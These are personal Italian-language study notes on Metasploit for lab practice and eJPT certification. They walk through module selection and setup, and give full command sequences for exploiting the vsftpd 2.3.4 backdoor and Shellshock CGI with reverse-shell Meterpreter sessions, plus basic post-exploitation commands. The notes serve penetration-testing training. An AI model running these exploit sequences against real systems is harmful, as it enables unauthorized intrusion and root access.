# Metasploit Notes

Appunti personali sull’utilizzo di Metasploit per exploitation in ambienti di laboratorio e preparazione eJPT.

> Tutti i comandi sono da usare solo in ambienti autorizzati e controllati.

---

## 1. Obiettivo

Metasploit serve per:

```text
cercare moduli
verificare vulnerabilità note
configurare exploit
ottenere sessioni
gestire shell e Meterpreter
fare post-exploitation in laboratorio
```

Regola importante:

```text
Enumeration first, exploitation later.
```

Prima di usare Metasploit bisogna sempre fare:

```text
1. Network discovery
2. Port scanning
3. Service enumeration
4. Analisi versioni
5. Scelta del modulo corretto
```

---

## 2. Avvio

Avviare Metasploit:

```bash
msfconsole
```

Prompt Metasploit:

```text
msf6 >
```

---

## 3. Ricerca moduli

Cercare moduli in base al servizio o alla vulnerabilità:

```text
search nome_servizio
search vsftpd
search samba
search tomcat
search unrealircd
search distccd
search cgi
```

Esempi:

```text
search vsftpd
search samba 3.0.20
search tomcat manager
search unrealircd
```

---

## 4. Selezione modulo

Selezionare un modulo:

```text
use exploit/path/del/modulo
```

Esempio Shellshock CGI:

```text
use exploit/multi/http/apache_mod_cgi_bash_env_exec
```

Esempio vsftpd:

```text
use exploit/unix/ftp/vsftpd_234_backdoor
```

---

## 5. Informazioni sul modulo

Visualizzare informazioni sul modulo:

```text
info
```

Visualizzare opzioni richieste:

```text
show options
```

Visualizzare payload disponibili:

```text
show payloads
```

Regola:

```text
Prima di lanciare un exploit, controllare sempre show options.
```

---

## 6. Parametri principali

```text
RHOSTS    = IP o hostname del target
RPORT     = porta del servizio target
LHOST     = IP della macchina attaccante
LPORT     = porta locale in ascolto
TARGETURI = percorso web da colpire
PAYLOAD   = payload usato dal modulo
```

Esempio:

```text
set RHOSTS 192.168.1.100
set RPORT 21
set LHOST 192.168.1.101
set LPORT 4444
```

Regola importante:

```text
RHOSTS = target
LHOST  = IP della tua Kali
```

Non usare:

```text
127.0.0.1
```

come `LHOST` per una reverse shell.

---

## 7. Workflow base Metasploit

Flusso standard:

```text
search
use
show options
set RHOSTS
set LHOST
run
```

Esempio generico:

```text
search nome_servizio
use exploit/path/module
show options
set RHOSTS TARGET
set LHOST KALI_IP
run
```

Dopo exploit riuscito:

```text
sessions
sessions -i 1
background
```

---

## 8. Esempio CGI / Shellshock

Modulo:

```text
exploit/multi/http/apache_mod_cgi_bash_env_exec
```

Comandi:

```text
use exploit/multi/http/apache_mod_cgi_bash_env_exec
show options
set RHOSTS target1.ine.local
set TARGETURI /browser.cgi
set LHOST <IP_KALI>
run
```

Interpretazione:

```text
RHOSTS indica il target.
TARGETURI indica il percorso CGI vulnerabile.
LHOST indica l'IP della Kali che riceverà la connessione.
```

---

## 9. Esempio Metasploitable2 - vsftpd 2.3.4

Durante la service enumeration è stato identificato:

```text
21/tcp open ftp vsftpd 2.3.4
```

Ricerca modulo:

```text
search vsftpd
```

Modulo usato:

```text
exploit/unix/ftp/vsftpd_234_backdoor
```

Selezione modulo:

```text
use exploit/unix/ftp/vsftpd_234_backdoor
```

Controllo opzioni:

```text
show options
```

Impostazione target:

```text
set RHOSTS 192.168.1.100
```

Se il payload richiede `LHOST`, impostare l’IP della Kali sulla rete laboratorio:

```text
set LHOST 192.168.1.101
```

Esecuzione:

```text
run
```

Output positivo:

```text
[+] 192.168.1.100:21 - Backdoor has been spawned!
[*] Meterpreter session 1 opened
```

Interpretazione:

```text
Exploit riuscito.
Sessione Meterpreter aperta sul target.
```

---

## 10. Errori comuni in Metasploit

### Errore 1: parametro scritto male

Errore:

```text
set RHOTS 192.168.1.100
```

Corretto:

```text
set RHOSTS 192.168.1.100
```

Nota:

```text
RHOSTS = Remote Hosts
```

---

### Errore 2: comando scritto maiuscolo

Errore:

```text
RUN
```

Corretto:

```text
run
```

Oppure:

```text
exploit
```

---

### Errore 3: LHOST mancante

Errore:

```text
One or more options failed to validate: LHOST
```

Causa:

```text
Il payload è reverse e deve sapere l'IP della macchina attaccante.
```

Correzione:

```text
set LHOST 192.168.1.101
```

---

## 11. Differenza tra prompt Metasploit e Meterpreter

Prompt Metasploit:

```text
msf6 >
msf6 exploit(...) >
```

Qui si usano:

```text
search
use
show options
set RHOSTS
set LHOST
run
show payloads
```

Prompt Meterpreter:

```text
meterpreter >
```

Qui si usano:

```text
getuid
sysinfo
pwd
ls
shell
background
```

Errore tipico:

```text
meterpreter > show payloads
Unknown command: show
```

Perché `show payloads` funziona nel prompt Metasploit, non dentro Meterpreter.

---

## 12. Comandi Meterpreter base

Verificare utente:

```text
getuid
```

Informazioni sistema:

```text
sysinfo
```

Directory corrente:

```text
pwd
```

Lista file:

```text
ls
```

Aprire shell Linux/Windows:

```text
shell
```

Mettere sessione in background:

```text
background
```

---

## 13. Dopo avere ottenuto una shell

Dentro una shell Linux:

```bash
whoami
id
hostname
uname -a
ip a
pwd
```

Se l’utente è root:

```text
whoami: root
uid=0(root)
```

significa che hai privilegi amministrativi completi sul target.

---

## 14. Gestione sessioni

Mostrare sessioni attive:

```text
sessions
```

Entrare in una sessione:

```text
sessions -i 1
```

Mettere sessione in background:

```text
background
```

Chiudere una sessione:

```text
exit
```

---

## 15. Regola pratica eJPT

Quando trovi una versione vulnerabile:

```text
1. Cerca il modulo
2. Leggi info
3. Controlla show options
4. Imposta RHOSTS
5. Imposta LHOST se richiesto
6. Esegui run
7. Verifica sessione
8. Esegui whoami/id
9. Documenta risultato
```

---

## 16. Catena esempio - vsftpd 2.3.4

```text
Nmap trova vsftpd 2.3.4
↓
search vsftpd
↓
use exploit/unix/ftp/vsftpd_234_backdoor
↓
show options
↓
set RHOSTS 192.168.1.100
↓
set LHOST 192.168.1.101
↓
run
↓
Meterpreter session opened
↓
getuid
↓
Server username: root
↓
shell
↓
whoami
↓
root
```

---

## 17. Note etiche

Metasploit deve essere usato solo:

```text
in laboratorio personale
in ambienti autorizzati
in CTF
in esami pratici dove è consentito
in attività professionali con autorizzazione scritta
```

Non usare Metasploit contro sistemi reali senza permesso esplicito.

